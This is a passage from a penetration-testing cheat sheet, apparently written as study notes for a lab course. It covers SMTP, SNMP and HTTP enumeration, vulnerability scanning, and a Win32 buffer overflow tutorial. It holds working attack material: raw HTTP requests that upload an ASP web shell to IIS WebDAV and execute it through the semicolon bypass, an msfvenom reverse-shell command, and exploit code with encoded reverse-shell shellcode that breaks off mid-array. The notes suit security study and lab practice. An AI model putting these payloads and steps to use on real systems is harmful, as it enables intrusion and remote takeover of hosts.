</code></pre></div><p>Use intel gathered from the passive information gathering stage to generate a users list to <code>VRFY</code> against the SMTP servers.</p>
<p>Although, SMTP configurations allowing for this type of enumeration is uncommon, there are many services and protocols with overly verbose output messages, which at times, allow us to find out interesting information, such as whether a user exist in their system using bruteforce.</p>
<p>Resources:</p>
<ul>
<li><a href="https://pentestlab.blog/tag/expn/">https://pentestlab.blog/tag/expn/</a></li>
<li>A list of unix usernames: <code>/usr/share/metasploit-framework/data/wordlists/unix_users.txt</code>.</li>
</ul>
<h2 id="snmp-enumeration">SNMP Enumeration</h2>
<p>UDP Port 161</p>
<p>Simple Network Management Protocol. Based on UDP, susceptible to IP spoofing, and replay attacks. SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning SNMP information and credentials can be easily intercepted over a local network. Traditional SNMP protocols also have weak authentication schemes, and are commonly left configured with default public and private community strings.</p>
<h3 id="mib-tree">MIB Tree</h3>
<p>SNMP Management Information Base</p>
<ul>
<li>Branches - Organizations or network functions</li>
<li>Leaves - Final endpoints, specific variable values that can be probed</li>
</ul>
<h3 id="scanning-for-snmp">Scanning for SNMP</h3>
<h4 id="finding-snmp-services-with-nmap">Finding SNMP services with <code>nmap</code></h4>
<p><code>nmap -sU -p 161 --open [ip]</code></p>
<h4 id="finding-snmp-services-with-onesixtyone">Finding SNMP services with <code>onesixtyone</code></h4>
<p>Common community strings:</p>
<ul>
<li><code>public</code></li>
<li><code>private</code></li>
<li><code>manager</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo public &gt; community
echo private &gt;&gt; community
echo manager &gt;&gt; community
<span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo 10.11.1.$ip; <span style="color:#66d9ef">done</span> &gt; ips
onesixtyone -c community -i ips
</code></pre></div><h3 id="windows-snmp-enumeration-example">Windows SNMP Enumeration Example</h3>
<p>We can probe and query the SNMP service, with at least the read-only community string, in most cases, <code>public</code>. SNMP services offer a wealth of information.</p>
<ul>
<li><code>snmp-check -c public -v 1 [ip]</code> - Enumerate entire MIB tree, and outputs in a very friendly, human-readable manner</li>
<li><code>snmpwalk -c public -v 1 [ip]</code> - Enumerate entire MIB tree</li>
<li><code>snmpwalk -c public -v 1 [ip] [oid]</code> - Enumerate specific information</li>
</ul>
<p>MIB OIDs:</p>
<ul>
<li><code>1.3.6.1.2.1.25.1.6.0</code> - System Processes</li>
<li><code>1.3.6.1.2.1.25.4.2.1.2</code> - Running Programs</li>
<li><code>1.3.6.1.2.1.25.4.2.1.4</code> - Processes Path</li>
<li><code>1.3.6.1.2.1.25.2.3.1.4</code> - Storage Units</li>
<li><code>1.3.6.1.2.1.25.6.3.1.2</code> - Software Name</li>
<li><code>1.3.6.1.4.1.77.1.2.25</code> - User Accounts</li>
<li><code>1.3.6.1.2.1.6.13.1.3</code> - TCP Local Ports</li>
</ul>
<h2 id="http-enumeration">HTTP Enumeration</h2>
<h3 id="enumerating-web-server-and-web-technology-versions">Enumerating Web Server and Web Technology Versions</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -i <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#75715e"># include response headers</span>
curl -I <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#75715e"># show info only (using HEAD)</span>
curl -L <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#75715e"># follow redirects</span>
</code></pre></div><h3 id="directory-fuzzing">Directory Fuzzing</h3>
<h4 id="gobuster"><code>gobuster</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster -u http://website.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">100</span> | tee gobuster.log
gobuster -u http://website.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">100</span> -c <span style="color:#e6db74">&#39;PHPSESSION=123&#39;</span> -x .php,.html | tee gobuster.log
</code></pre></div><h4 id="dirsearch"><code>dirsearch</code></h4>
<p>Great for websites that have extensions (eg. php). Added <code>wp</code> to dicc.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./dirsearch.py -u http://192.168.1.23 -e txt -t <span style="color:#ae81ff">50</span> <span style="color:#75715e"># use dirsearch&#39;s default dict, which proved to be quite successful</span>
./dirsearch.py -u http://192.168.1.23 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -t <span style="color:#ae81ff">50</span>
</code></pre></div><h3 id="nikto-web-scanner"><code>nikto</code> Web Scanner</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nikto -h 192.168.1.23
nikto -h 192.168.1.23 -Plugins outdated
</code></pre></div><p>A function within its code, &ldquo;map_codes&rdquo;, seems to take forever to finish. Add a <code>return;</code> statement to line 228 of <code>/var/lib/nikto/plugins/nikto_core.plugin</code> to patch it.</p>
<h3 id="wpscan-wordpress-scanner"><code>wpscan</code> Wordpress Scanner</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wpscan -u example.com --enumerate p,t,u,tt <span style="color:#75715e"># plugins, themes, usernames and timthumbs --log wpscanlog</span>
</code></pre></div><p>Note, after installing either neovim or samba-4.5.15, wpscan stops working.</p>
<h3 id="webdav-in-iis-servers">WebDAV in IIS Servers</h3>
<ol>
<li>If you notice an IIS Server, scan for WebDAV using <code>nmap --script=http-webdav-scan,http-iis-webdav-vuln</code> (vuln checks for protected folders that can by bypassed)</li>
<li>Find unprotected/protected folders</li>
</ol>
<ul>
<li>If protected, bypass by:
<ul>
<li>Adding a <code>Translate: f</code> header</li>
<li>Inserting the characters <code>%c0%af</code> into any uri request longer than 1 character</li>
</ul>
</li>
</ul>
<ol start="3">
<li>Identify file types that can be uploaded and executed (accessed) with <code>davtest -cleanup -url http://url/folder</code></li>
<li>Use msfvenom to generate and upload PHP (if PHP is available) or ASP shell using PUT request</li>
</ol>
<ul>
<li>If <code>.php</code> or <code>.asp</code> cannot be uploaded, upload it as an acceptable file type like <code>.txt</code></li>
<li>Perform a COPY or MOVE request to rename the <code>.txt</code> back into <code>.php</code> or <code>.asp</code></li>
<li>If that doesn&rsquo;t work, try using the semicolon bypass by renaming it to <code>shell.php;.txt</code> or <code>shell.asp;.txt</code></li>
</ul>
<ol start="5">
<li>Open a listener and access your shell by visiting your shell page or by using a GET request</li>
</ol>
<p>Generating Shell Payload</p>
<ul>
<li>ASP Shell Msfvenom: <a href="http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html</a></li>
</ul>
<p>Bypassing Protected Folders</p>
<ul>
<li><a href="https://blog.skullsecurity.org/2009/webdav-detection-vulnerability-checking-and-exploitation">https://blog.skullsecurity.org/2009/webdav-detection-vulnerability-checking-and-exploitation</a></li>
<li><a href="https://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf">https://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf</a></li>
</ul>
<p>Bypassing Restricted File Type Uploads</p>
<ul>
<li>WebDAV Upload Bypass with COPY: <a href="http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html</a></li>
<li>Semicolon Vulnerability: <a href="https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/">https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/</a></li>
</ul>
<p>Other Resources:</p>
<ul>
<li>Typical Full Flow: <a href="http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html</a></li>
<li>WebDAV Metasploit Module Examples: <a href="http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html">http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html</a></li>
</ul>
<h4 id="ways-to-interact-with-webdav-server">Ways to Interact with WebDAV Server</h4>
<p>5 Methods to Upload to WebDAV</p>
<ul>
<li><a href="http://www.hackingarticles.in/5-ways-to-exploiting-put-vulnerability/">http://www.hackingarticles.in/5-ways-to-exploiting-put-vulnerability/</a></li>
</ul>
<h5 id="cadaver"><code>cadaver</code></h5>
<pre><code>cadaver http://[ip]/[folder]
put, copy, move, get, etc.
</code></pre><h5 id="webdav-interaction-with-burpsuite">WebDAV Interaction with BurpSuite</h5>
<p>Note: It is important to leave the whitespaces after the request, to let the server know that you have completed stating your request, just like in nc, otherwise the server will wait and hang.</p>
<p>Retrieve properties of a resource</p>
<pre><code>PROPFIND / HTTP/1.1
Host: 192.168.1.23
Content-Type: text/xml
Content-Length: 147
Depth: 0
Translate: f

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;a:propfind xmlns:a=&quot;DAV:&quot;&gt;
&lt;a:prop&gt;&lt;a:getcontenttype/&gt;&lt;/a:prop&gt;
&lt;a:prop&gt;&lt;a:getcontentlength/&gt;&lt;/a:prop&gt;
&lt;/a:propfind&gt;


</code></pre><p>Directory listing</p>
<pre><code>GET / HTTP/1.1
Host: 192.168.1.23


</code></pre><p>Upload ASP shell with .txt extension to WebDAV using PUT</p>
<pre><code>PUT /shell.txt HTTP/1.1
Host: 192.168.1.23
Content-Length: 38337

[ASP shellcode content here]
</code></pre><p>Move shell.txt to shell.asp;.txt</p>
<pre><code>COPY /shell.txt HTTP/1.1
Host: 192.168.1.23
Destination: http://192.168.1.23/shell.asp%3b.txt


</code></pre><p>Execute shell.asp;.txt, make sure to open a nc listener on port 443</p>
<pre><code>GET /shell.asp%3b.txt HTTP/1.1
Host: 192.168.1.23


</code></pre><h3 id="cgi">CGI</h3>
<ul>
<li>Use <code>/usr/share/seclists/Discovery/Web_Content/cgis.txt</code> wordlist to find cgi pages.</li>
<li><code>searchsploit apache cgi</code></li>
<li><code>nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi</code></li>
</ul>
<h3 id="php">PHP</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># PHP 5.5.9 search order, edit if necessary, eg. php version, windows?.</span>
searchsploit --colour -t php <span style="color:#ae81ff">5</span> | grep -v <span style="color:#e6db74">&#39;/dos/\|/windows&#39;</span> | grep -iP <span style="color:#e6db74">&#39;^(php|apache \+ php) (\d|&lt;)&#39;</span>
searchsploit --colour -t php 5.5 | grep -v <span style="color:#e6db74">&#39;/dos/\|/windows&#39;</span> | grep -iP <span style="color:#e6db74">&#39;^(php|apache \+ php) (\d|&lt;)&#39;</span>
searchsploit --colour -t php 5.x | grep -v <span style="color:#e6db74">&#39;/dos/\|/windows&#39;</span> | grep -iP <span style="color:#e6db74">&#39;^(php|apache \+ php) (\d|&lt;)&#39;</span>
</code></pre></div><h3 id="http-enumeration-tips">HTTP Enumeration Tips</h3>
<h4 id="wordlists">Wordlists</h4>
<ul>
<li>Dirsearch - ~/tools/dirsearch/db/dicc.txt</li>
<li>DirB - /usr/share/dirb/wordlists/</li>
<li>wfuzz - /usr/share/wfuzz/wordlist/</li>
<li>SecList - /usr/share/seclists/
<ul>
<li>/usr/share/seclists/Discovery/Web_Content/</li>
<li>/usr/share/seclists/Discovery/Web_Content/common.txt</li>
<li>/usr/share/seclists/Discovery/Web_Content/cgis.txt</li>
</ul>
</li>
</ul>
<h4 id="hardcoded-links">Hardcoded Links</h4>
<p>If a website has hardcoded links like &ldquo;<a href="http://pinkdb.com">http://pinkdb.com</a>&rdquo; or &ldquo;http://172.16.5.5&rdquo;, which you do not have access to, simply an entry like <code>[actual server ip] [hardcoded value]</code> (eg. <code>192.168.1.23 pinkydb.com</code>) to <code>/etc/hosts</code></p>
<h4 id="apache-directory-default-layouts">Apache Directory Default Layouts</h4>
<p><a href="https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29">https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29</a></p>
<h4 id="host-header">Host Header</h4>
<p>The host-Header tells the webserver which virtual host to use. Sometimes servers may behave differently when the host-header is changed from their IP to their hostname (example.com).</p>
<h4 id="lookout-for">Lookout For</h4>
<ul>
<li>Apache mod_x, as they may be vulnerable</li>
<li>WebDAV</li>
<li>CGI</li>
</ul>
<h2 id="ident-enuemeration">ident Enuemeration</h2>
<h3 id="ident-user-enum"><code>ident-user-enum</code></h3>
<p>Identify owners of processes</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ident-user-enum 192.168.1.23 <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">113</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">445</span>
</code></pre></div><h1 id="vulnerability-scanning">Vulnerability Scanning</h1>
<h2 id="vulnerability-scanning-with-nmap">Vulnerability Scanning with Nmap</h2>
<p>NSE scripts that scans for vulnerabilities are at <code>ls -l /usr/share/nmap/scripts/*vuln*</code>.</p>
<ul>
<li><code>nmap -p 80 --script=all 192.168.1.23</code> - Scan a target using all NSE scripts. May take an hour to complete.</li>
<li><code>nmap -p 80 --script=*vuln* 192.168.1.23</code> - Scan a target using all NSE vuln scripts.</li>
<li><code>nmap -p 80 --script=http*vuln* 192.168.1.23</code> - Scan a target using all HTTP vulns NSE scripts.</li>
<li><code>nmap -p 21 --script=ftp-anon 192.168.1.0/24</code> - Scan entire network for FTP servers that allow anonymous access.</li>
<li><code>nmap -p 80 --script=http-vuln-cve2010-2861 192.168.1.0/24</code> - Scan entire network for a directory traversal vulnerabilitiy. It can even retrieve admin&rsquo;s password hash.</li>
</ul>
<h2 id="the-openvas-vulnerability-scanner">The OpenVAS Vulnerability Scanner</h2>
<h3 id="openvas-initial-setup">OpenVAS Initial Setup</h3>
<p><code>openvas-setup</code></p>
<p>Apparently, the program will fail. Thankfully, OpenVAS is already installed on the OffSec VM: <a href="https://forums.offensive-security.com/showthread.php?3216-05-2-1-Changes-to-quot-OpenVAS-Initial-Setup-quot-(openvas-setup)&amp;p=12828#post12828">https://forums.offensive-security.com/showthread.php?3216-05-2-1-Changes-to-quot-OpenVAS-Initial-Setup-quot-(openvas-setup)&amp;p=12828#post12828</a> and <a href="https://forums.offensive-security.com/showthread.php?10139-OpenVas-Setup-issue&amp;p=54721#post54721">https://forums.offensive-security.com/showthread.php?10139-OpenVas-Setup-issue&amp;p=54721#post54721</a></p>
<p>Just run the following commands to get it up and running.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">openvasmd --user<span style="color:#f92672">=</span>admin --new-password<span style="color:#f92672">=</span>NEW_PASSWORD
service redis-server start
service greenbone-security-assistant start
service openvas-scanner start
service openvas-manager start
firefox https://127.0.0.1:9392
</code></pre></div><p>Add new target -&gt; add new scan using target -&gt; run</p>
<h1 id="buffer-overflows">Buffer Overflows</h1>
<h2 id="fuzzing">Fuzzing</h2>
<p>Fuzz base on buffer length and perhaps different characters, check for crashes, and observe memory stack in debugger.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> socket
string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">10000</span>, <span style="color:#ae81ff">200</span>):
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Fuzzing PASS with {} bytes&#39;</span><span style="color:#f92672">.</span>format(i)
    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
    s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;192.168.1.23&#39;</span>, <span style="color:#ae81ff">110</span>))
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;USER test</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;PASS {}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(string <span style="color:#f92672">*</span> i))
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;QUIT</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
    s<span style="color:#f92672">.</span>close()
</code></pre></div><h1 id="win32-buffer-overflows">Win32 Buffer Overflows</h1>
<p>Stack overflow simulation</p>
<pre><code>ESP -&gt; 1000 .... \
       1001 .... |- # Current function
       1002 .... |
       1003 .... /
EBP -&gt; 1003 100A # Previous EBP further down
       1004 3AFD # Return address to previous calling function
       1005 ....
       1006 ....
</code></pre><pre><code>ESP -&gt; 1000 AAAA \
       1001 AAAA |- # Current function
       1002 AAAA |
       1003 AAAA /
EBP -&gt; 1003 AAAA # Previous EBP further down
       1004 BBBB # Return address to previous calling function
       1005 CCCC
       1006 ....
</code></pre><pre><code># Function completes, and starts cleaning up.
# leave (mov esp, ebp)

       1000 AAAA \
       1001 AAAA |- # Current function
       1002 AAAA |
       1003 AAAA /
EB/SP-&gt;1003 AAAA # Previous EBP further down
       1004 BBBB # Return address to previous calling function
       1005 CCCC
       1006 ....
</code></pre><pre><code># leave (pop ebp) (ebp is now AAAA, and esp + 1)

       1000 AAAA \
       1001 AAAA |- # Current function
       1002 AAAA |
       1003 AAAA /
       1003 AAAA
ESP -&gt; 1004 BBBB # Return address to previous calling function
       1005 CCCC
       1006 ....
</code></pre><pre><code># ret (pop eip) (eip is now BBBB, and esp + 1)

       1000 AAAA
       1001 AAAA
       1002 AAAA
       1003 AAAA
       1004 BBBB # Return address to previous calling function, popped as EIP
ESP -&gt; 1005 CCCC
       1006 ....
</code></pre><pre><code># jmp esp

ESP -&gt; 1005 NOPS # nop sled to avoid shellcode from &quot;stepping on its toes&quot; while decoding
       1006 NOPS
       1007 CCCC # shellcode
       1008 CCCC
       1009 CCCC
       100A CCCC
</code></pre><h2 id="crashing">Crashing</h2>
<p>With fuzzing, see whether server crashes after a certain length buffer.</p>
<ul>
<li>Fuzz</li>
<li>Check for crash</li>
</ul>
<h2 id="controlling-eip">Controlling EIP</h2>
<p>With a debugger like Immunity Debugger, see whether EIP is overwritten with your buffer.</p>
<ol>
<li>Run vulnerable server</li>
<li>Open Immunity Debugger</li>
<li>Attach server process</li>
<li>Run</li>
<li>Send long buffer</li>
<li>In Immunity Debugger check whether EIP has been overwritten</li>
</ol>
<h2 id="find-offset">Find Offset</h2>
<ol>
<li>Use <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length]</code> to create a cyclic pattern with the buffer length</li>
<li>Restart server and debugger</li>
<li>Send buffer</li>
<li>Record overwritten EIP</li>
<li>Use <code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [eip value]</code> to find offset</li>
<li>Update buffer with new offset, and enter a custom value to overwrite EIP.</li>
<li>Pad the buffer to see how much more bytes you can fill in the stack after overwriting EIP. If the EIP does not get overwritten anymore, your buffer is too long, decrease the appended padding size. Anything above 500 bytes will be good to go, as most shellcode sizes are 300-500 bytes.</li>
</ol>
<h2 id="check-for-bad-characters">Check for Bad Characters</h2>
<ol>
<li>Replace the appended padding with:</li>
</ol>
<pre><code>badchars = (
'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20'
'\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30'
'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40'
'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50'
'\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60'
'\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70'
'\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80'
'\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90'
'\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0'
'\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0'
'\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0'
'\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0'
'\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0'
'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0'
'\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')
</code></pre><ol start="2">
<li>Restart server and debugger</li>
<li>Send buffer</li>
<li>Right click on ESP and follow in memory dump</li>
<li>Check whether any of the bytes are missing. A quick way is to look through the last column and see whether all the xF aligns</li>
</ol>
<pre><code>   01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
192.168.1.23 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f
20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f
30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f
40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f
50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f
60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f
70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f
80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f
90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f
a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af
b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf
c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf
d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df
e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef
f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff
</code></pre><ol start="6">
<li>Record bad characters, including <code>0x00</code> as that is a null byte. Keep them in mind when finding a <code>JMP</code> location and when generating shellcode later on</li>
</ol>
<h2 id="finding-a-register-to-jump-to-your-shellcode">Finding a Register to Jump to Your Shellcode</h2>
<ol>
<li>Restart server and debugger, keeping it paused</li>
<li>Send buffer and crash the service</li>
<li>Check out the registers, find one that points to the buffer you sent, or somewhere close. In this case the register ESP points directly after the overwritten EIP</li>
<li>Right click on top-left assembly window</li>
<li>Search for &gt; Command</li>
<li>Enter <code>jmp esp</code></li>
<li>Ensure the address does not include bad characters</li>
<li>Record the address of the instruction</li>
</ol>
<h3 id="alternatives">Alternatives</h3>
<p>If no results were found in step 4, try Search for &gt; Sequence of commands, enter the following, and use that address instead:</p>
<pre><code>push esp
retn
</code></pre><p>If there are still no results, try finding those commands elsewhere in the program&rsquo;s DLLs with Mona.</p>
<ol>
<li>List all DLLs being used with <code>!mona modules</code> at the bottom of Immunity Debugger</li>
<li>Try finding a module that has nearly all security features in &ldquo;False&rdquo; state (Rebase, SafeSEH, ASLR, NXCompat)</li>
<li>Click on <code>e</code> in Immunity Debugger to open &ldquo;Executable Modules&rdquo; window</li>
<li>Locate the module and double click on it</li>
<li>Repeat steps 2-6 in the previous section to search for instructions</li>
</ol>
<p>If there are still no results, which is uncommon for complex modules, no worries. The default &ldquo;Search for&rdquo; function in Immunity Debugger only searches within executable regions, which is usually in the <code>.text</code> segment of the module, which can be viewed by clicking on <code>m</code> in Immunity Debugger. Notice the <code>R E</code> in the same row as the module&rsquo;s <code>.text</code> segment. If the program is compiled with DEP support, the <code>JMP ESP</code> would <strong>have</strong> to be located within <code>.text</code> segment. If it is not, fortunately you can find the instructions in non-executable segments as well.</p>
<p>Since we can&rsquo;t use Immunity Debugger &ldquo;Search for&rdquo; function, we&rsquo;ll have to use Mona to find the instructions for us</p>
<ol>
<li>Find the opcode for the <code>JMP ESP</code> instruction with <code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code> and type in <code>jmp esp</code>. The result is <code>FFE4</code></li>
<li>In Immunity Debugger, type <code>!mona find -s &quot;\xff\xe4&quot; -m [module.dll]</code> to search for the instruction within the entire module</li>
<li>Pick a result that does not contain any bad characters in the address</li>
<li>Jump to the address location by clicking on the black &ldquo;wall bang&rdquo;-looking button in the Immunity Debugger toolbar, and entering the address</li>
<li>Confirm that the instructionn is <code>JMP ESP</code></li>
<li>Record the address of the instruction</li>
</ol>
<h3 id="linux-objdump">Linux Objdump</h3>
<p>You can use Kali to find the offset of certain instructions from let&rsquo;s say a DLL:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">objdump -D -M intel user32.dll | grep <span style="color:#e6db74">&#39;jmp.*esp&#39;</span> | head
</code></pre></div><h2 id="generate-shellcode">Generate Shellcode</h2>
<ol>
<li>Generate shellcode payload with <code>msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=192.168.1.23 LPORT=443 -f c -b '\x00' -e x86/shikata_ga_nai EXITFUNC=thread</code>, swap out with your listener IP and port, bad chars with <code>-b '\x00,\x0A,\x0D'</code> for example, etc. The <code>EXITFUNC=thread</code> ensures that only the thread serving your exploit is terminated, not the entire process by default</li>
<li>Paste in a NOP sled of about 16 <code>\x90</code>s after the overwritten EIP, and then the shellcode, and then the padding. Since the shellcode decoder is going to require some workspace in the stack (the same area where the shellcode is being stored), it will require some buffer space to avoid &ldquo;stepping on its own toes&rdquo;.</li>
<li>Open a listener and pop the shell</li>
</ol>
<h2 id="example-final-code">Example Final Code</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#f92672">import</span> socket
s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()

shellcode <span style="color:#f92672">=</span> (
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc1\xba\x8d\x2f\x0e\x1c\xd9\x74\x24\xf4\x5d\x29\xc9\xb1</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x31\x55\x17\x03\x55\x17\x83\x48\x2b\xec\xe9\xae\xdc\x72</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x4e\x1d\x13\x9b\xab\x2c\x13\xff\xb8\x1f\xa3\x8b\xec\x93</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xd9\x04\x27\x3c\xf6\x2b\x80\x8b\x20\x02\x11\xa7\x11\x05</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x91\xba\x45\xe5\xa8\x74\x98\xe4\xed\x69\x51\xb4\xa6\xe6\xc4</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x28\xc2\xb3\xd4\xc3\x98\x52\x5d\x30\x68\x54\x4c\xe7\xe2\x0f</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4e\x06\x26\x24\xc7\x10\x2b\x01\x91\xab\x9f\xfd\x20\x7d\xee</span><span style="color:#e6db74">&#34;</span>
